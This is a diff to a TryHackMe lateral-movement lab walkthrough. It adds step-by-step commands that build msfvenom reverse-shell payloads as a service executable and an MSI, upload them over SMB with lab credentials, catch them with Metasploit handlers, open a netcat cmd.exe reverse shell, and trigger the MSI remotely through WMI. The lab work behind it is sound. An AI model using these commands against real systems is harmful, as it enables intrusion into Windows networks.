@@ -314,25 +314,33 @@ Once you have started the service, you should receive a connection in your Attac
 
     * Connect to THMJMP2 via SSH
     
-        `ssh za\\rachael.atkinson@thmjmp2.za.tryhackme.com`
+        ```
+        ssh za\\rachael.atkinson@thmjmp2.za.tryhackme.com
+        ```
 
         ![task3-ssh](./images/task3-ssh.png)
 
     * Create Payload
     
-        `msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.49.31 LPORT=4444 -o myservice.exe`
+        ```
+        msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.49.31 LPORT=4444 -o myservice.exe
+        ```
 
         ![task3-create-payload](./images/task3-create-payload.png)
 
     * Upload Payload
     
-        `smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever`
+        ```
+        smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
+        ```
 
         ![task3-upload-payload](./images/task3-upload-payload.png)
 
     * Running msfconsole
     
-        `msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"`
+        ```
+        msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
+        ```
 
         ![task3-handler](./images/task3-handler.png)
 
@@ -344,7 +352,9 @@ Once you have started the service, you should receive a connection in your Attac
 
     * Running sc.exe with admin credential
     
-        `runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.49.31 5555"`
+        ```
+        runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.49.31 5555"
+        ```
 
         ![task3-runas](./images/task3-runas.png)
 
@@ -540,6 +550,71 @@ As a result, you should receive a connection in your AttackBox from where you ca
 ### Answer the questions below
 
 * After running the "flag.exe" file on t1_corine.waters desktop on THMIIS, what is the flag?
+
+    ``
+
+    * Get the Crendential
+    
+        ![task4-credential](./images/task4-credential.png)
+
+    * Connect to THMJMP2 via SSH
+    
+        ```
+        ssh za\\natasha.howells@thmjmp2.za.tryhackme.com
+        ```
+
+        ![task4-ssh](./images/task4-ssh.png)
+
+    * Create Payload
+    
+        ```
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=5555 -f msi > myinstaller.msi
+        ```
+
+        ![task4-payload](./images/task4-payload.png)
+
+    * Upload payload
+    
+        ```
+        smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
+        ```
+
+        ![task4-upload](./images/task4-upload.png)
+
+    * Start a handler to receive the reverse shell from Metasploit
+    
+        ```
+        msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST lateralmovement; set LPORT 5555; exploit"
+        ```
+
+        ![task4-handler](./images/task4-handler.png)
+
+    * Run powershell
+    
+        ![task4-powershell](./images/task4-powershell.png)
+
+    * Start a WMI session against THMIIS 
+    
+        ```
+        $username = 't1_corine.waters';
+        $password = 'Korine.1994';
+        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+        $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+        $Opt = New-CimSessionOption -Protocol DCOM
+        $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
+        ```
+
+    * We then invoke the Install method from the Win32_Product class to trigger the payload
+    
+        ```
+        Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
+        ```
+
+        ![task4-thmiis](./images/task4-thmiis.png)
+
+    * Get the flag
+    
+        
 
 ## Task 5 - Use of Alternate Authentication Material
 
